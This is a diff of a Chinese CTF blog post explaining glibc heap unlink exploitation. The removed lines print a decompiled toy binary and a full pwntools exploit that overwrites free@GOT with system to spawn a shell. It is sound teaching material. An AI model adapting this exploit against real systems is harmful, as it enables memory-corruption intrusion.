@@ -1,161 +1,4 @@
----
-layout:     post
-title:      "Unlink 原理与利用"
-subtitle:   "用一道Pwn题说起"
-date:       2018-07-23 10:00:00
-author:     "Chris"
-catalog: true
-tags:
-    - Pwn
-    - 笔记
- 
----
-
-
-## 0x00 代码分析
-
-1，检查保护
-
-```python
-[*] '/home/chris/Pwn/heap-unlink'
-    Arch:     i386-32-little
-    RELRO:    No RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x8048000)
-```
-2，使用IDA分析程序流程
-
-**main 函数分析**
-
-```c
-void __cdecl main()
-{
-  int v0;   #[esp+Ch] [ebp-Ch]
-
-  v0 = 0;
-  setbuf(stdout, 0);
-  setbuf(stdin, 0);
-  while ( 1 )
-  {
-    sub_804858B();
-    v0 = -1;
-    __isoc99_scanf("%d", &v0);
-    switch ( v0 )
-    {
-      case 1:
-        sub_80485F7();
-        break;
-      case 2:
-        sub_804867D();
-        break;
-      case 3:
-        sub_8048702();
-        break;
-      case 4:
-        sub_804876C();
-        break;
-      case 5:
-        exit(0);
-        return;
-      default:
-        continue;
-    }
-  }
-}
-```
-读入你输入的选项，然后执行对应的函数
-
-**Add 函数分析**
-
-```c
-void *sub_80485F7()
-{
-  void *result;   #eax
-  int v1;   #ebx
-  size_t size;   #[esp+Ch] [ebp-Ch]
-
-  size = 0;
-  if ( dword_8049D88 > 9 )
-    return (void *)write(1, "cannot add chunks!", 0x12u);
-  write(1, "Input the size of chunk you want to add:", 0x28u);
-  __isoc99_scanf("%d", &size);
-  result = (void *)size;
-  if ( (signed int)size > 0 )
-  {
-    v1 = dword_8049D88++;
-    result = malloc(size);
-    buf[v1] = result;
-  }
-  return result;
-}
-```
-这里分析出来一个指针数组
-
-	  char * buf[n]
-
-**Set 函数分析**
-
-```c
-ssize_t sub_804867D()
-{
-  int v1;   #[esp+Ch] [ebp-Ch]
-
-  v1 = -1;
-  write(1, "Set chunk index:", 0x10u);
-  __isoc99_scanf("%d", &v1);
-  if ( v1 < 0 )
-    return write(1, "Set chunk data error!\n", 0x16u);
-  write(1, "Set chunk data:", 0xFu);
-  return read(0, buf[v1], 0x400u);
-}
-```
-设置add的堆空间内容
-
-**Delete 函数分析**
-
-```c
-void sub_8048702()
-{
-  int v0;   #[esp+Ch] [ebp-Ch]
-
-  v0 = -1;
-  write(1, "Delete chunk index:", 0x13u);
-  __isoc99_scanf("%d", &v0);
-  if ( v0 >= 0 )
-    free(buf[v0]);
-  else
-    write(1, "Delete chunk error!\n", 0x14u);
-}
-```
-free后指针未置零
-
-**Print 函数分析**
-
-```c
-ssize_t sub_804876C()
-{
-  ssize_t result;   #eax
-  int v1;   #[esp+Ch] [ebp-Ch]
-
-  v1 = -1;
-  write(1, "Print chunk index:", 0x12u);
-  __isoc99_scanf("%d", &v1);
-  if ( v1 >= 0 )
-    result = write(1, buf[v1], 0x100u);
-  else
-    result = write(1, "Print chunk error!\n", 0x13u);
-  return result;
-}
-```
-该函数的功能就是输出buf[ ]指向内存区域的内容。
-
-## 0x01 漏洞分析
-
-add函数，程序malloc分配的堆空间在内存中是连续的，但是在Set函数设置堆空间内容时没有限制长度，导致溢出，这里我们使用unlink拿shell。
-
-<span id="unlink"></span>
-## 0x02 unlink介绍
+## 原理
 
 一旦涉及到free内存，那么就意味着有新的chunk由allocated状态变成了free状态，此时glibc malloc就需要进行合并操作——向前以及(或)向后合并。这里所谓向前向后的概念如下：将previous free chunk合并到当前free chunk，叫做向后合并；将后面的free chunk合并到当前free chunk，叫做向前合并。
 
@@ -166,7 +9,7 @@ add函数，程序malloc分配的堆空间在内存中是连续的，但是在Se
 define unlink(AV, P, BK, FD) {                                            
     FD = P->fd;                     
     BK = P->bk;                 
-    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))//malloc中新增加的防止double free的判断
+    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
       malloc_printerr (check_action, "corrupted double-linked list", P, AV);  
     else {                                    
         FD->bk = BK;                    
@@ -344,28 +187,9 @@ if (__glibc_unlikely (!prev_inuse(nextchunk))){//如果下一个chunk没有标�
 }
 
 ```
+## 利用
 
-## 0x03 漏洞利用
-
-这里把利用过程分为7个步骤：
-
-* 新建chunk 0 1 2 和 3，大小80（申请size/4=偶数 避免chunk空间复用，且fastbin释放不会有unlink）,并设置chunk 3数据为“/bin/sh”（为什么不设置chunk 2?因为在后面add数据的时候chunk 2地址会被输入的回车符‘0xA’破坏）
-* 设置chunk 0数据，伪造fake_chunk
-* free(chunk[1])，触发unlink
-* 设置chunk 0数据，修改chunk[1]为address
-* DynELF反复leak出目标主机system函数地址
-* 修改*（free@got）为system函数地址
-* 释放chunk 3，触发system(“/bin/sh”)
-
-
-#### 新建chunk 0 1 2 3
-
-栈空间如图()：
-
-![pic8]
-
-
-#### 设置chunk 0数据，伪造fake_chunk
+#### 通过溢出设置chunk 0数据，伪造fake_chunk
 
 如图：
 
@@ -418,114 +242,14 @@ if (F -> bk == p && B -> fd == p){
 
 ![pic2]
 
-#### Leaking
 
-这样我们可以通过`set_chunk（0，data = "A" * 12 + p32(&buf-12) + p32(addr)）`保持chunk 0指向&buf-12，并覆盖chunk 1地址为addr,leak出system地址
-
-万事俱备，只欠东风~
-
-我们只需要重新调用set_chunk（0，data....），将chunk 1的地址覆盖为free()got.plt,这样当我们使用set_chunk(1,system_addr)便将system函数地址写进了free函数的got表，然后调用free（chunk 3）[chunk 3里面装有/bin/sh]，启动shell。
-
-## 0x04 完整脚本
-
-```python
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
-from pwn import *
-
-p = process("./heap-unlink")
-
-start = 0x8049d60 #start=&chunk0
-free_got = 0x8049ce8
-
-flag = 0
-def leak(addr):
-    data = "A" * 0xc + p32(start-0xc) + p32(addr)
-    global flag
-    if flag == 0:
-        set_chunk(0, data)
-        flag = 1
-    else:
-        set_chunk2(0, data)
-    data = ""
-    p.recvuntil('5.Exit\n')
-    data = print_chunk(1)
-    print("leaking: %#x ---> %s" % (addr, data[0:4].encode('hex')))
-    return data[0:4]
-
-def add_chunk(len):
-    print p.recvuntil('\n')
-    p.sendline('1')
-    print p.recvuntil('Input the size of chunk you want to add:')
-    p.sendline(str(len))
-
-def set_chunk(index,data):
-    p.recvuntil('5.Exit\n')
-    p.sendline('2')
-    p.recvuntil('Set chunk index:')
-    p.sendline(str(index))
-    p.recvuntil('Set chunk data:')
-    p.sendline(data)
-
-def set_chunk2(index, data):
-    p.sendline('2')
-    p.recvuntil('Set chunk index:')
-    p.sendline(str(index))
-    p.recvuntil('Set chunk data:')
-    p.sendline(data)
-
-def del_chunk(index):
-    p.recvuntil('\n')
-    p.sendline('3')
-    p.recvuntil('Delete chunk index:')
-    p.sendline(str(index))
-
-def print_chunk(index):
-    p.sendline('4')
-    p.recvuntil('Print chunk index:')
-    p.sendline(str(index))
-    res = p.recvuntil('5.Exit\n')
-    return res
-
-add_chunk(80)  #0
-add_chunk(80)  #1
-add_chunk(80)  #2
-add_chunk(80)  #3
-set_chunk(3, '/bin/sh')
-
-#fake_chunk
-payload = ""
-payload += p32(0) + p32(81) + p32(start-12) + p32(start-8)
-payload += "A"*(80-4*4)
-payload += p32(80) + p32(88)
-
-set_chunk(0,payload)
-
-del_chunk(1)
-
-#leak system_addr
-pwn_elf = ELF('./heap-unlink')
-d = DynELF(leak, elf=pwn_elf)
-sys_addr = d.lookup('system', 'libc')
-print("system addr: %#x" % sys_addr)
-
-data = "A" * 12 + p32(start-12) + p32(free_got)
-set_chunk2('0', data)
-
-set_chunk2('1', p32(sys_addr))
-
-del_chunk('3')
-p.interactive()
-p.close()
-```
-## 0x05 总结
+## 总结
 
 程序中存在堆溢出且长度可观时，很容易构造出unlink；但是当程序没有长度溢出，或者堆大小固定时，我们可以构造chunk错位（伪造）的方式来构造unlink的空闲chunk；还有就是利用合并后被放入unsortedbin中的chunk，利用UAF
 ，对合并前的堆块进行构造。详细见[2018强网杯silent2](https://bbs.pediy.com/thread-247020.htm)和[网鼎杯Pwn之babyheap](https://sirhc.xyz/2018/09/02/%E7%BD%91%E9%BC%8E%E6%9D%AFPwn%E4%B9%8Bbabyheap/)
 
->[文件下载](https://github.com/yxshyj/project/tree/master/pwn/heap-unlink)
 
-## 0x06 参考资料
+## 参考
 
 >[Linux堆溢出漏洞利用之unlink – 阿里移动安全](http://www.vuln.cn/6327)
 
